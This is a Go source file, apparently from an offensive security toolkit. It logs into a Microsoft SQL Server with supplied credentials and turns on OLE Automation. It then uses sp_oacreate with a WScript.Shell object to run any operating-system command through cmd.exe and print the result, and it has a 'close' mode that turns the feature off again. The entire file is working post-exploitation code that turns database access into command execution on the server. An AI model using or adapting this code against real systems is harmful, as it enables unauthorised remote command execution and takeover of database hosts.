//From: https://github.com/mabangde/pentesttools/blob/master/golang/sqltool.go
package sqlcmd

import (
	"cube/log"
	"cube/model"
	"database/sql"
	"fmt"
	_ "github.com/denisenkom/go-mssqldb"
)

func MssqlCom(task model.SqlcmdTask) (result model.SqlcmdTaskResult) {
	result = model.SqlcmdTaskResult{SqlcmdTask: task, Result: "", Err: nil}

	dataSourceName := fmt.Sprintf("server=%v;port=%v;user id=%v;password=%v;database=%v", task.Ip,
		task.Port, task.User, task.Password, "tempdb")
	conn, err := sql.Open("mssql", dataSourceName)
	defer conn.Close()
	if err != nil {
		log.Error(err.Error())
	}
	if task.Query == "close" {
		closeOle(*conn)
		fmt.Println("Close sp_oacreate Successful")
		return
	}
	OpenOle(*conn)
	osShellCom(*conn, task.Query)

	return result
}

func osShellCom(conn sql.DB, cmd string) {
	sqlstr := fmt.Sprint("declare @shell int,@exec int,@text int,@str varchar(8000); \n" +
		"exec sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}',@shell output\nexec sp_oamethod @shell,'exec',@exec output,'c:\\windows\\system32\\cmd.exe /c " + cmd + "'\nexec sp_oamethod @exec, 'StdOut', @text out;\nexec sp_oamethod @text, 'ReadAll', @str out\nselect @str")
	log.Debug(sqlstr)
	rows, err := conn.Query(sqlstr)
	if err != nil {
		panic(err.Error())

	}
	defer rows.Close()

	columns, err := rows.Columns()
	if err != nil {
		panic(err.Error())
	}
	values := make([]sql.RawBytes, len(columns))
	scanArgs := make([]interface{}, len(values))
	for i := range values {
		scanArgs[i] = &values[i]
	}

	for rows.Next() {
		err = rows.Scan(scanArgs...)
		if err != nil {
			panic(err.Error())
		}
		var value string
		for _, col := range values {
			if col == nil {
				value = ""
			} else {
				value = string(col)
			}
			fmt.Println(value)

		}

	}
	if err = rows.Err(); err != nil {
		panic(err.Error()) // proper error handling instead of panic in your app
	}
}
